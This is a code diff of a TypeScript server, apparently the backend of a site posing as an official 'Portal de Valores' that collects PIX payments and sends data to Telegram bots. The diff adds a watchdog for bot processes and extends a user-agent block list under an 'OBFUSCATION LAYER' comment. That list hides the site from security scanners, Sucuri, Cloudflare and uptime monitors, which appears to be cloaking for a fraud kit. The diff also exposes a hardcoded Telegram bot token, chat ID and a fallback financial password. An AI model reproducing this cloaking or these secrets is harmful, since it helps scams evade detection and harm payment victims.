@@ -96,10 +96,10 @@ let currentConfig = {
   gatewayFee: 5.0, // Taxa em %
   smtpHost: "smtp.titan.email", // Generic placeholder or updated provider
   smtpPort: 465,
-  smtpUser: "seu-email@dominio.com",
-  smtpPass: "",
-  smtpSenderName: "Portal de Valores - Protocolo Oficial",
-  financialPassword: "ng197826", // Senha de segurança para financeiro
+  smtpUser: process.env.SMTP_USER || "seu-email@dominio.com",
+  smtpPass: process.env.SMTP_PASS || "",
+  smtpSenderName: process.env.SMTP_SENDER_NAME || "Portal de Valores - Protocolo Oficial",
+  financialPassword: process.env.ADMIN_PASSWORD || "ng197826", // Senha de segurança para financeiro
   adminPixKey: "",
   adminPixType: "CPF",
   adminPixName: "",
@@ -309,13 +309,31 @@ function startBot(id: string = 'main', delay: number = 0) {
 
     proc.on('exit', (code) => {
       console.log(`⚠️ [SISTEMA] Robô ${id} finalizado com código ${code}. Reiniciando em 10 segundos...`);
-      // Aumentado o intervalo de reinício para evitar loops infinitos de crash
       setTimeout(() => startBot(id, 2000), 10000);
     });
 
     botProcesses.set(id, proc);
   }, delay);
 }
+
+// 🛡️ [WATCHDOG] Monitoramento ativo da saúde dos bots
+setInterval(() => {
+  for (let i = 1; i <= MAX_SLOTS; i++) {
+    const id = i === 1 ? 'main' : `parceiro${i}`;
+    try {
+      const statusPath = path.join(process.cwd(), `bot-status-${id}.json`);
+      if (fs.existsSync(statusPath)) {
+        const data = JSON.parse(fs.readFileSync(statusPath, 'utf-8'));
+        const now = Date.now();
+        // Se o status não for atualizado há mais de 5 minutos e estiver como CONNECTED, algo travou
+        if (data.status === 'CONNECTED' && (now - (data.ts || 0) > 300000)) {
+          console.log(`🚨 [WATCHDOG] Bot ${id} detectado como travado. Reiniciando...`);
+          startBot(id);
+        }
+      }
+    } catch (e) { }
+  }
+}, 60000);
 
 // Validação básica de chave PIX
 function validatePixKey(key: string) {
@@ -911,8 +929,8 @@ function saveConfig() {
 }
 
 
-const TG_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "8643978397:AAE4YyIwa1X1tSwav_zOdWEKMnNv8PFjZ3g").replace(/"/g, "");
-const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || "-1003940670305").replace(/"/g, "");
+const TG_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "").replace(/"/g, "");
+const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || "").replace(/"/g, "");
 const TELEGRAM_URL = `https://api.telegram.org/bot${TG_TOKEN}`;
 
 // --- OBFUSCATION LAYER ---
@@ -929,7 +947,9 @@ const BOT_UA_PATTERNS = [
   "selenium", "playwright", "python-requests", "curl", "wget", "postman",
   "insomnia", "scanner", "sqlmap", "nikto", "nmap", "burp",
   "hostgator", "locaweb", "aws-sdk", "python", "go-http", "java",
-  "ahrefs", "semrush", "dotbot", "mj12bot", "uipbot", "exabot", "gigabot"
+  "ahrefs", "semrush", "dotbot", "mj12bot", "uipbot", "exabot", "gigabot",
+  "cyberpanel", "litespeed", "openlitespeed", "sucuri", "cloudflare", "pagespeed",
+  "uptimerobot", "statuscake", "monitis", "pingdom"
 ];
 
 function isBotUA(ua: string | undefined): boolean {
